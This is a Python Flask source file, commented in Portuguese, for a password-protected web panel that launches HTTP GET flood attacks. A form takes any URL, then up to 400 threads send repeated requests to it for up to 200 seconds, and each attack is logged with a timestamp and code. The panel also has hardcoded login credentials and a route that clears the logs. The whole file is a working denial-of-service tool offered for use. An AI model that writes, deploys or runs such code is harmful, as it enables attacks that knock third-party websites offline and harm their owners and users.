from flask import Flask, render_template, request, redirect, url_for, session
import threading
import time
import requests
from datetime import datetime
import os

app = Flask(__name__)
app.secret_key = 'McFlySystem2025'

# Diretório de logs
if not os.path.exists('logs'):
    os.makedirs('logs')

# Login
USERNAME = 'mcflyoperador'
PASSWORD = 'senhapadrao1234'

# Função de ataque real (GET request massivo)
def ataque(url, tempo, threads):
    fim = time.time() + tempo

    def flood():
        while time.time() < fim:
            try:
                requests.get(url, timeout=3)
                print(f"Enviado para {url}")
            except:
                pass

    thread_list = []

    for _ in range(threads):
        t = threading.Thread(target=flood)
        t.start()
        thread_list.append(t)

    for t in thread_list:
        t.join()

    gerar_log(url)


# Gera relatório
def gerar_log(url):
    agora = datetime.now().strftime('%d/%m/%Y %H:%M:%S')
    codigo = os.urandom(4).hex().upper()
    log = f"URL:{url} | DATA&HORA:{agora} | CÓDIGO:{codigo}\n"

    with open('logs/relatorio.txt', 'a') as f:
        f.write(log)


# Rotas

@app.route('/')
def home():
    if 'logged_in' in session:
        return render_template('index.html')
    else:
        return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if (request.form['username'] == USERNAME and
                request.form['password'] == PASSWORD):
            session['logged_in'] = True
            return redirect(url_for('home'))
        else:
            return render_template('login.html', erro='Credenciais incorretas')
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

@app.route('/ataque', methods=['POST'])
def iniciar_ataque():
    if 'logged_in' in session:
        url = request.form['url']
        if not url.startswith('http'):
            url = 'http://' + url

        tempo = min(int(request.form['tempo']), 200)
        threads = min(int(request.form['threads']), 400)

        thread = threading.Thread(target=ataque, args=(url, tempo, threads))
        thread.start()

        return f"Ataque iniciado em {url} por {tempo} segundos com {threads} threads."
    else:
        return redirect(url_for('login'))

@app.route('/logs')
def ver_logs():
    if 'logged_in' in session:
        try:
            with open('logs/relatorio.txt', 'r') as f:
                conteudo = f.read()
        except FileNotFoundError:
            conteudo = ''
        return render_template('logs.html', logs=conteudo)
    else:
        return redirect(url_for('login'))

@app.route('/limpar_logs')
def limpar_logs():
    if 'logged_in' in session:
        open('logs/relatorio.txt', 'w').close()
        return redirect(url_for('ver_logs'))
    else:
        return redirect(url_for('login'))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
